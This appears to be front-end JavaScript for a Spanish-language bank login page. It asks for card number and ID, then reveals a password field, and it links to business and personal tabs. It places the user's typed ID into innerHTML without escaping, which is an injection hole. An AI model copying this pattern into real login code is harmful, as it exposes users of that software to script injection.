    const form        = document.getElementById('login-form');
    const inpTarjeta  = document.getElementById('input-tarjeta');
    const inpSec      = document.getElementById('input-secundario');
    const groupSec    = document.getElementById('group-secundario');
    const btnCont     = document.getElementById('btn-continuar');
    const btnIngresar = document.getElementById('btn-ingresar');
    const btnBncnet   = document.getElementById('btn-bncnet');
    const btnDebJ     = document.getElementById('btn-debito-juridica');

    form.addEventListener('keydown', e => {
      if (e.key === 'Enter' && btnIngresar.style.display === 'none') {
        e.preventDefault();
      }
    });

    btnCont.addEventListener('click', () => {
      if (!inpTarjeta.value.trim() || !inpSec.value.trim()) {
        alert('Por favor completa Tarjeta y Cédula antes de continuar.');
        return;
      }
      inpTarjeta.readOnly = true;
      groupSec.innerHTML = `
        <input type="hidden" name="cedula" value="${inpSec.value}">
        <input name="password" id="input-password" type="password" placeholder="Contraseña" required>
      `;
      btnCont.style.display     = 'none';
      btnIngresar.style.display = 'block';
      document.getElementById('input-password').focus();
    });

    document.getElementById('tab-personas')
      .addEventListener('click', () => window.location.href = '../../personas/index.php');
    document.getElementById('tab-empresas')
      .addEventListener('click', () => window.location.href = 'index.php');

    btnBncnet.addEventListener('click', () => window.location.href = '../index.php');
    btnDebJ.addEventListener('click', () => {});

    document.addEventListener('DOMContentLoaded', () => {
      document.getElementById('tab-empresas').classList.add('active');
      btnDebJ.classList.add('active');
      btnBncnet.classList.add('non-active');
    });